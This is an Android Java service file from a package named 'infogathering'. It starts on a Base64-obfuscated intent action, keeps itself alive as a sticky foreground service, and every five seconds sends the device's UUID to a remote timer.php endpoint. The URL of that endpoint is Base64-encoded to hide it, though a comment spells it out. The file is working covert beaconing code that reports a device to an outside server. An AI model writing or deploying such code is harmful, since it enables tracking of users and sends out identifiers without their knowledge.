package com.a000webhostapp.aquatic_establishme.infogathering;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import java.io.IOException;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.OkHttpClient;
import okhttp3.Request;

public class MyService extends Service {
    public static final String START_SERVICE = "Zm9vYmFy" ;
    private Timer timer = new Timer();
    public MyService() {
        super();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.d("Service", "Service startCommand");
        if (intent.getAction() == null)
            return START_NOT_STICKY;
        else if(intent.getAction().equals(new String(Base64.decode(START_SERVICE,Base64.DEFAULT)))){
            Log.d("Service", "Action: " + intent.getAction() + new String(Base64.decode(START_SERVICE,Base64.DEFAULT)));
            PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(), 0, new Intent(), 0);
            Notification notification;
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
                NotificationManager mNotificationManager =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if(mNotificationManager == null)
                    return START_NOT_STICKY;
                mNotificationManager.createNotificationChannel(new NotificationChannel("MY_CHANN_FOO", "MY_CHANN_FOO_NAME", NotificationManager.IMPORTANCE_DEFAULT));
                notification = new Notification.Builder(getApplicationContext(), "MY_CHANN_FOO")
                        .setOngoing(true)
                        .setContentTitle(getString(R.string.app_name))
                        .setContentText(getApplicationContext().getPackageName())
                        .setContentIntent(pendingIntent)
                        .build();
            }else{
                notification = new Notification.Builder(getApplicationContext())
                        .setOngoing(true)
                        .setContentTitle(getString(R.string.app_name))
                        .setContentText(getApplicationContext().getPackageName())
                        .setContentIntent(pendingIntent)
                        .build();
            }

            notification.flags = notification.flags | Notification.FLAG_FOREGROUND_SERVICE;
            startForeground(123456, notification);

            timer.scheduleAtFixedRate(new TimerTask(){
                OkHttpClient client = new OkHttpClient();
                @Override
                public void run(){
                    Request request = new Request.Builder()
                            //http://aquatic-establishme.000webhostapp.com/timer.php?q=
                            .url(new String(Base64.decode("aHR0cDovL2FxdWF0aWMtZXN0YWJsaXNobWUuMDAwd2ViaG9zdGFwcC5jb20vdGltZXIucGhwP3E9",Base64.DEFAULT))+MainActivity.uuid)
                            .get()
                            .build();
                    try {
                        client.newCall(request).execute();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }, 10, 5000);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy(){
        super.onDestroy();
        timer.cancel();
    }
}
